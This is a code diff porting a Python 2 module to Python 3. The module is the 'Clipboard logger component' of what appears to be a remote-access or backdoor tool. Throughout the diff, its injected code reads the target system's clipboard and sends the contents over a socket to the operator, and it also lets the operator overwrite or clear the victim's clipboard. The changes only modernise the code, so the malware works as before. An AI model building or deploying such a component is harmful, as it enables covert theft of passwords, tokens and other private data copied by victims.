@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -11,13 +10,13 @@ def main(option):
 def clip_logger(option):
     flag = option.split(' ',1)
     if flag[0] == 'clip_dump':
-        s.sendall('[+]Got clipboard data : \\n' + pyperclip.paste())
+        s.sendall(('[+]Got clipboard data : \\n' + pyperclip.paste()).encode())
     elif flag[0] == 'clip_set':
         pyperclip.copy(flag[1])
-        s.sendall('[+]Set clipboard text to : ' + flag[1])
+        s.sendall(('[+]Set clipboard text to : ' + flag[1]).encode())
     elif flag[0] == 'clip_clear':
         pyperclip.copy('')
-        s.sendall('[+]Cleared clipboard')''')
+        s.sendall('[+]Cleared clipboard'.encode())''')
         config.logics.append('''
             elif command in ('clip_dump', 'clip_set', 'clip_clear'):
                 clip_logger(data)''')
@@ -25,8 +24,8 @@ def clip_logger(option):
         config.help_menu['clip_set <text to set clipboard to>'] = 'Set the value of the clipboard on the target system'
         config.help_menu['clip_clear'] = 'Clear the clipboard data on the target system'
     elif option == 'info':
-        print '\nName             : Clipboard logger component' \
+        print('\nName             : Clipboard logger component' \
               '\nOS               : Linux' \
               '\nRequired Modules : pyperclip (External), xclip utility for Linux (Non python external dependency, target system needs to have this as well)' \
               '\nCommands         : clip_set <text to set clipboard to>, clip_dump, clip_clear' \
-              '\nDescription      : Allows for control over the clipboard, set, read or clear the clipboard data\n'
+              '\nDescription      : Allows for control over the clipboard, set, read or clear the clipboard data\n')
